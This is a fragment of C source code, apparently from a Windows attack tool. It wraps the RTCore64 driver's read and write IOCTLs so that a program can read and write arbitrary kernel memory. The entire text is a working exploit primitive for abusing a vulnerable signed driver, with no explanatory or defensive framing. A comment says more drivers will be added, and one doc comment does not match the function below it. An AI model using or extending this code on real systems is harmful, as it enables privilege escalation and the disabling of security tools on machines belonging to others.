// ============================================================== RTCore64 Driver Functions ============================================================== //
// To be placed on a separate file later... (create a separate ones for different drivers!)
/**
 * Check if a service with the given service name is installed.
 * 
 * @return bool Positive if it is installed.
 */

HANDLE RTCoreOpenDevice(void) { // Generates a file handle used to communicate with the driver.
	PRINT("[*] Trying to obtain handle to symbolic link of driver.\n");
	return CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
}


BOOL RTCoreReadMemory(HANDLE Device, DWORD Size, DWORD64 Address, DWORD * Value) {
    RTCORE64_MEMORY_READ MemoryRead = { 0 };
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    DWORD BytesReturned;

	// send read IOCTL to the RTCore driver
    BOOL bStatus = DeviceIoControl(Device, RTCORE64_MEMORY_READ_CODE,
                                   &MemoryRead,
                                   sizeof(MemoryRead),
                                   &MemoryRead,
                                   sizeof(MemoryRead),
                                   &BytesReturned,
                                   NULL);

    *Value = MemoryRead.Value;
    return bStatus;
}

BOOL RTCoreWriteMemory(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE MemoryWrite = { 0 };
    MemoryWrite.Address = Address;
    MemoryWrite.WriteSize = Size;
    MemoryWrite.Value = Value;
    DWORD BytesReturned;

	// send write IOCTL to the RTCore driver
    BOOL bStatus = DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE,
                                   &MemoryWrite,
                                   sizeof(MemoryWrite),
                                   &MemoryWrite,
                                   sizeof(MemoryWrite),
                                   &BytesReturned,
                                   NULL);

    return bStatus;
}
